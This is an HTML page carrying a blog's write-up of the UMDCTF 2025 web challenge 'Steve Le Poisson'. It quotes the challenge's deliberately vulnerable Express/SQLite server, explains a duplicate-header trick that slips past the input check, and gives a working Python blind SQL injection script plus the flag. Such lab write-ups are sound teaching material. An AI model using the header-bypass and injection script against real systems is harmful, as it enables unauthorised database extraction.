<!DOCTYPE html>
<html lang="en">

<head>
    <title>Steve Le Poisson  &ndash; alanoo.dev</title>
    <meta name="description" content="My dev page :)">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta charset="utf-8" />
    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" integrity="sha512-HK5fgLBL+xu6dm/Ii3z4xhlSUyZgTT9tuc/hSrtw6uzJOvgRr2a9jyxxT1ely+B+xFAmJKVSTbpM/CuL7qxO8w==" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css" integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin="anonymous" />
    <link rel="stylesheet" href="/css/colour/gruvbox-dark.css">
    <link rel="stylesheet" href="/css/colour/dark-mode.css">
    <link rel="stylesheet" href="/css/risotto.css">
    <link rel="stylesheet" href="/css/custom.css">
</head>

<body>
    <div class="page">
        <header class="page__header">
            <h1 class="page__logo"><a href="/" class="page__logo-inner">alanoo.dev</a></h1>
            <nav class="page__nav main-nav">
                <ul>
    
    
                    <li class="main-nav__item"><a class="nav-main-item" href="/achievements/" title="Posts">Achievements</a></li>
                    
                    <li class="main-nav__item"><a class="nav-main-item" href="/writeups/" title="Writeups">Writeups</a></li>
                
                    <li class="main-nav__item"><a class="nav-main-item" href="/posts/" title="Projects">wip</a></li>
                    
                    </ul>
            </nav>
        </header>

        <section class="page__body">
            <header class="content__header">
                <h1>Steve Le Poisson <code><span style="color:#2ed8e8">web</code></pre></h1>
            </header>
            <div class="content__body">
                <h2 id="kategori">Category</h2>
                <p>Web</p>
                <h2 id="author">Chall Author</h2>
                <p>tahmid-23</p>
                <h2 id="stats">Stats</h2>
                <p>Total Solves: <strong>139/708 Teams</strong></p>
                <p>Final Points: <strong>369p</strong></p>
                <h2 id="description">Description</h2>
                <p>il est orange</p>
                <h2 id="prewords">Preface</h2>
                <p>Before the CTF I was practicing my Blind SQL skills and let me just say that it really paid off. Props to the challenge author for making my favourite web chall of the CTF!<p>
                <h2 id="website">Looking at the website</h2>
                <p>The website's only page was the index page. What was on it you may ask? Well have a look yourself:</p>
                <div style="display: flex; align-items: center; gap: 10px;">
                    <video id="video" width="400" height="500" controls>
                        <source src="/writeups/umdctf-2025/steve-la-poisson/assets/video.mp4" type="video/mp4">
                        Your browser does not support the video tag.
                    </video>
                    <div id="text">
                        <p>Steve, le- (Poi-)</p>
                        <p>Le poisson Steve (Poisson Steve)</p>
                        <p>Il est orange (Orange, ooh-ooh)</p>
                        <p>Il a des bras, et des jambes</p>
                        <p>Le poisson Steve</p>
                    </div>
                </div>
                
                <script>
                    const video = document.getElementById('video');
                    const text = document.getElementById('text');
                    let colorInterval;
                    function getRandomColor() {
                        return `#${Math.floor(Math.random() * 16777215).toString(16)}`;
                    }
                    function startColorChange() {
                        colorInterval = setInterval(() => {
                            text.style.color = getRandomColor();
                        }, 1000);
                    }
                    function stopColorChange() {
                        clearInterval(colorInterval);
                        text.style.color = '';
                    }
                    video.addEventListener('play', startColorChange);
                    video.addEventListener('pause', stopColorChange);
                    video.addEventListener('ended', stopColorChange);
                </script>
                <p></p>
                <p>Yes that's it! Expected anything less?</p>
                <p>Okay but looking into the challenge I didn't really find anything more than the static js which didnt help. Let's look into the source!</p>
                <h2 id="sourcecode">Looking at the Source</h2>
                <p>Looking at the source code I looked for the logic that handles what we can input. That being the <strong>filename</strong> and <strong>contents</strong> of the file:</p>
                <div class="highlight">
                    <pre style="font-size: 14px;"><code class="language-javascript">
// üì¶ Importation des modules n√©cessaires pour faire tourner notre monde sous-marin num√©rique
const express = require("express");   // Express, le cadre web minimaliste mais puissant
const sqlite3 = require("sqlite3");   // SQLite version brute, pour les bases de donn√©es l√©g√®res
const sqlite = require("sqlite");     // Une interface moderne (promesse-friendly) pour SQLite
const cors = require("cors");         // Pour permettre √† d'autres domaines de parler √† notre serveur ‚Äî Steve est sociable, mais pas trop

// üê† Cr√©ation de l'application Express : c‚Äôest ici que commence l‚Äôaventure
const app = express();

// üß™ Fonction de validation des en-t√™tes HTTP
// Steve, ce poisson √† la sensibilit√© exacerb√©e, d√©teste les en-t√™tes trop longs, ambigus ou myst√©rieux
function checkBadHeader(headerName, headerValue) {
    return headerName.length > 80 || 
           (headerName.toLowerCase() !== 'user-agent' && headerValue.length > 80) || 
           headerValue.includes('\0'); // Le caract√®re nul ? Un blasph√®me pour Steve.
}

// üõü Middleware pour autoriser les requ√™tes Cross-Origin
app.use(cors());

// üßô Middleware maison : ici, Steve le Poisson filtre les requ√™tes selon ses principes aquatiques
app.use((req, res, next) => {
    let steveHeaderValue = null; // On pr√©pare le terrain pour r√©cup√©rer l‚Äôen-t√™te sacr√©
    let totalHeaders = 0;        // Pour compter ‚Äî car Steve compte. Tout. Toujours.

    // üîç Parcours des en-t√™tes bruts, deux par deux (cl√©, valeur)
    for (let i = 0; i < req.rawHeaders.length; i += 2) {
        let headerName = req.rawHeaders[i];
        let headerValue = req.rawHeaders[i + 1];

        // ‚ùå Si un en-t√™te ne pla√Æt pas √† Steve, il coupe net la communication
        if (checkBadHeader(headerName, headerValue)) {
            return res.status(403).send(`Steve le poisson, un animal marin d‚Äôapparence inoffensive mais d‚Äôopinion tranch√©e, n‚Äôa jamais vraiment support√© tes en-t√™tes HTTP. Chaque fois qu‚Äôil en voit passer un ‚Äî m√™me sans savoir de quoi il s‚Äôagit exactement ‚Äî son ≈ìil vitreux se plisse, et une sorte de grondement bouillonne dans ses branchies. Ce n‚Äôest pas qu‚Äôil les comprenne, non, mais il les sent, il les ressent dans l‚Äôeau comme une vibration mal align√©e, une dissonance num√©rique qui le met profond√©ment mal √† l‚Äôaise. Il dit souvent, en tournoyant d‚Äôun air dramatique : ¬´ Pourquoi tant de formalisme ? Pourquoi cacher ce qu‚Äôon est vraiment derri√®re des cha√Ænes de caract√®res obscures ? ¬ª Pour lui, ces en-t√™tes sont comme des algues synth√©tiques : inutiles, pr√©tentieuses, et surtout √©trang√®res √† la fluidit√© du monde sous-marin. Il pr√©f√©rerait mille fois un bon vieux flux binaire brut, sans tous ces ornements absurdes. C‚Äôest une affaire de principe.`); // Message dramatique de Steve
        }

        // üîÆ Si on trouve l‚Äôen-t√™te "X-Steve-Supposition", on le garde
        if (headerName.toLowerCase() === 'x-steve-supposition') {
            steveHeaderValue = headerValue;
        } 

        totalHeaders++; // üßÆ On incr√©mente notre compteur de verbosit√© HTTP
    }

    // üßª Trop d‚Äôen-t√™tes ? Steve explose. Litt√©ralement.
    if (totalHeaders > 30) {
        return res.status(403).send(`Steve le poisson, qui est orange avec de longs bras muscl√©s et des jambes nerveuses, te fixe avec ses grands yeux globuleux. "Franchement," grogne-t-il en agitant une nageoire transform√©e en doigt accusateur, "tu abuses. Beaucoup trop d‚Äôen-t√™tes HTTP. Tu crois que c‚Äôest un concours ? Chaque requ√™te que tu envoies, c‚Äôest un roman. Moi, je dois nager dans ce flux verbeux, et c‚Äôest moi qui me noie ! T‚Äôas entendu parler de minimalisme ? Non ? Et puis c‚Äôest quoi ce d√©lire avec des en-t√™tes dupliqu√©s ? Tu crois que le serveur, c‚Äôest un psy, qu‚Äôil doit tout √©couter deux fois ? Retiens-toi la prochaine fois, ou c‚Äôest moi qui coupe la connexion."`); // Encore un monologue dramatique de Steve
    }

    // üôÖ‚Äç‚ôÇÔ∏è L‚Äôen-t√™te sacr√© est manquant ? Blasph√®me total.
    if (steveHeaderValue === null) {
        return res.status(400).send(`Steve le poisson, toujours orange et furibond, bondit hors de l‚Äôeau avec ses jambes fl√©chies et ses bras crois√©s. "Non mais s√©rieusement," r√¢le-t-il, "o√π est pass√© l‚Äôen-t√™te X-Steve-Supposition ? Tu veux que je devine tes intentions ? Tu crois que je lis dans les paquets TCP ? Cet en-t√™te, c‚Äôest fondamental ‚Äî c‚Äôest l√† que tu d√©clares tes hypoth√®ses, tes intentions, ton respect pour le protocole sacr√© de Steve. Sans lui, je suis perdu, confus, d√©sorient√© comme un poisson hors d‚Äôun proxy.`);
    }

    // üß™ Validation de la structure de la supposition : uniquement des caract√®res honorables
    if (!/^[a-zA-Z0-9{}]+$/.test(steveHeaderValue)) {
        return res.status(403).send(`Steve le poisson, ce poisson orange √† la peau luisante et aux nageoires muscl√©es, unique au monde, capable de nager sur la terre ferme et de marcher dans l'eau comme si c‚Äô√©tait une moquette moelleuse, te regarde avec ses gros yeux globuleux remplis d‚Äôune indignation abyssale. Il claque de la langue ‚Äì oui, car Steve a une langue, et elle est tr√®s expressive ‚Äì en te voyant saisir ta supposition dans le champ pr√©vu, un champ sacr√©, un espace r√©serv√© aux caract√®res honorables, alphab√©tiques et num√©riques, et toi, mis√©rable bip√®de aux doigts t√©m√©rairement chaotiques, tu as os√© y glisser des signes de ponctuation, des tilde, des di√®ses, des dollars, comme si c‚Äô√©tait une brocante de symboles oubli√©s. Tu crois que c‚Äôest un terrain de jeu, hein ? Mais pour Steve, ce champ est un pacte silencieux entre l‚Äôhumain et la machine, une zone de puret√© syntaxique. Et te voil√†, en train de profaner cette convention sacr√©e avec ton ‚Äú%‚Äù et ton ‚Äú@‚Äù, comme si les r√®gles n‚Äô√©taient que des suggestions. Steve bat furieusement des pattes arri√®re ‚Äì car oui, il a aussi des pattes arri√®re, pour la traction tout-terrain ‚Äì et fait jaillir de petites √©claboussures d‚Äô√©cume terrestre, signe supr√™me de sa col√®re. ‚ÄúPourquoi ?‚Äù te demande-t-il, avec une voix grave et solennelle, comme un vieux capitaine marin √©chou√© dans un monde digital, ‚ÄúPourquoi chercher la dissonance quand l‚Äôharmonie suffisait ? Pourquoi saboter la beaut√© simple de ‚ÄòazAZ09‚Äô avec tes gribouillages postmodernes ?‚Äù Et puis il s‚Äôapproche, les yeux pliss√©s, et te lance d‚Äôun ton sec : ‚ÄúTu n‚Äôes pas digne de l‚Äôen-t√™te X-Steve-Supposition. Reviens quand tu sauras deviner avec dignit√©.`);
    }

    // ‚úÖ Si tout est bon, Steve laisse passer la requ√™te
    next();
});

// üîç Point d'entr√©e principal : route GET pour "deviner"
app.get('/deviner', async (req, res) => {
    // üìÇ Ouverture de la base de donn√©es SQLite
    const db = await sqlite.open({
        filename: "./database.db",           // Chemin vers la base de donn√©es
        driver: sqlite3.Database,            // Le moteur utilis√©
        mode: sqlite3.OPEN_READONLY          // j'ai oublieÃÅ cÃßa
    });

    // üìã Ex√©cution d'une requ√™te SQL : on cherche si la supposition de Steve est correcte
    const rows = await db.all(`SELECT * FROM flag WHERE value = '${req.get("x-steve-supposition")}'`);

    res.status(200); // üëç Tout va bien, en apparence

    // üß† Si aucune ligne ne correspond, Steve se moque gentiment de toi
    if (rows.length === 0) {
        res.send("Bah, tu as tort."); // Pas de flag pour toi
    } else {
        res.send("Tu as raison!");    // Le flag √©tait bon. Steve t‚Äôaccorde son respect.
    }
});

// üö™ On lance le serveur, tel un aquarium ouvert sur le monde
const PORT = 3000;
app.listen(PORT, "0.0.0.0", () => {
  console.log(`Serveur en √©coute sur http://localhost:${PORT}`);
});
                    </code></pre>
                </div>
                <p></p>
                <p>Most of the code is in french but ignoring that we can actually make out what it means without google translate!</p>
                <p>The server is written in js and 2 endpoints. / and /deviner. The interesting parts is the middleware and especially the <strong>x-steve-supposition header.</strong></p>
                <p>The code basically gets whatever is in that header and uses that in this db query:</p>
                <p><code><pre><span style="color:#765fb1">
SELECT * FROM flag WHERE value = '${req.get("x-steve-supposition")}'
                </span></code></pre></p>
                <p>Meaning that if we can achieve a SQL Injection using the header.</p>
                <h2 id="problem">What stops us?</h2>
                <p>Well it has a bunch of checks, and the most important one being the regexp:</p>
                <div class="highlight">
                    <pre style="font-size: 14px;"><code class="language-javascript">
if (!/^[a-zA-Z0-9{}]+$/.test(steveHeaderValue)) 
                </code></pre>          
                <p>This stops us from trying any SQLI, bummer. Well I sat and tried different things while observing the source code closer and found a little flaw with their backend.</p>
                <p>The checks and regexp check the first X-Steve-Supposition header right? But what if we had 2...</p>
                <p>Meaning that if we have a X-Steve-Supposition header first with our SQLI payload and then another one aftet the first with a random value like "a" we could effectively bypass all the checks!</p>
                <p>So it would look like this:</p>
                <p><img src="/writeups/umdctf-2025/steve-la-poisson/assets/2.png"></p>
                <h2 id="SQLI">SQLI</h2>
                <p>Now its time to figure out how we get the flag using the newfound vulnerability.</p>
                <p>We cannot dump it directly as we can only get 1 of 2 responses: "Tu as raison!" and "Bah, tu as tort."</p>
                <p>But we know that we get Tu as raison when we execute a valid SQL payload so doesn't that mean that we can use Blind SQL Injection? Well yeah!</p>
                <p><img src="/writeups/umdctf-2025/steve-la-poisson/assets/3.png"></p>
                <p>We know that the first letter of the flag is U becasue of the flag format UMDCTF. So trying this gives us "Tu as raison! but changing the letter to for example "A" gives "Bah, tu as tort."</p>
                <p>I was not planning on spending 10h manually doing this for every letter, number and character so lets get scripting:</p>
                <h2 id="finalsolve">Solution Script</h2>
                <div class="highlight">
                    <pre style="font-size: 14px;"><code class="language-python">
import httpx
import string

URL = "https://steve-le-poisson-api.challs.umdctf.io/deviner"
CHARS = string.ascii_letters + string.digits + "{}_"
flagga = ""

client = httpx.Client(http2=True)

def koka(position, character):
    injection = f"' UNION SELECT value FROM flag WHERE substr(value, {position}, 1) = '{character}' --"
    headers = {
        "X-Steve-Supposition": injection,
        "x-Steve-Supposition": "a"
    }
    response = client.get(URL, headers=headers)
    if "Tu as raison!" in response.text:
        print("yes")
        return True
    else:
        print("no")
        return False

position = 1
while True:
    found = False
    for c in CHARS:
        print(f"\n{position} '{c}'")
        if koka(position, c):
            flagga += c
            print(f"found: {position}: '{c}'")
            print(f"{flagga} hitills")
            position += 1
            found = True
            break
    if not found:
        print(f"fel h√§r: {position}")
        break
    if flagga.endswith('}'):
        print("solved: ", flagga)
        break
                </code></pre></div>
                <p></p>
                <p>And after a few minutes I got the flag!</p>
                <h2 id="flag">Flag</h2>
                
                <p><img src="/writeups/umdctf-2025/steve-la-poisson/assets/4.png"></p>
                <code><span style="color:#c3b8de">UMDCTF{ile5TVR4IM3NtTresbEAu}</span></code>
            </div>
            <footer class="content__footer"></footer>
        </section>

        <section class="page__aside">
            <div class="aside__about">
                <div class="aside__about">
                    <h1 class="about__title">alanoo.dev</h1>
                    <p class="about__description">My dev page :).</p>
                </div>
                <ul class="aside__social-links">
                    <li>
                        <a href="https://admin.tryhackme.com" rel="me" aria-label="secret" title="secret"><i class="fas fa-flag" aria-hidden="true"></i></a>&nbsp;
                    </li>
                </ul>
                
            </div>
            <hr>
            <div class="aside__content">
                <p>
                    By alanoo 
                    2025-04-30
                </p>
                <hr>
                <span style="color:#ca7c9f">Table of Contents:</span>
                <nav id="TableOfContents">

                    <div style="white-space: nowrap;">
                        <span style="color:#4d5859">1.</span> <a href="#description">Description</a>
                      </div>
                      <div style="white-space: nowrap;">
                        <span style="color:#4d5859">2.</span> <a href="#prewords">Preface</a>
                      </div>
                      <div style="white-space: nowrap;">
                        <span style="color:#4d5859">3.</span> <a href="#website">Looking at the Website</a>
                      </div>
                      <div style="white-space: nowrap;">
                        <span style="color:#4d5859">4.</span> <a href="#sourcecode">Looking at the Source</a>
                      </div>
                    <div><span style="color:#4d5859">5.</span> <a href="#problem">What stops us?</a></div>
                    <div><span style="color:#4d5859">6.</span> <a href="#SQLI">SQLI</a></div>
                    <div><span style="color:#4d5859">7.</span> <a href="#finalsolve">Solution Script</a></div>
                    <div><span style="color:#4d5859">8.</span> <a href="#flag">Flag</a></div>

        </nav>

        
                        </div>
                        <p></p>
                        <div class="logo-container" style="display: flex; justify-content: center; align-items: center;">
                            <img src="/writeups/umdctf-2025/assets/umdctf.png">
                          </div>
                    </section>
        
                    <footer class="page__footer"><p>
        
            <p class="copyright"></p>
            <p class="advertisement">Powered by <a href="https://gohugo.io/">hugo</a> and <a href="https://github.com/joeroe/risotto">risotto</a>.</p>
        </footer>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-html.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>

</body>

</html>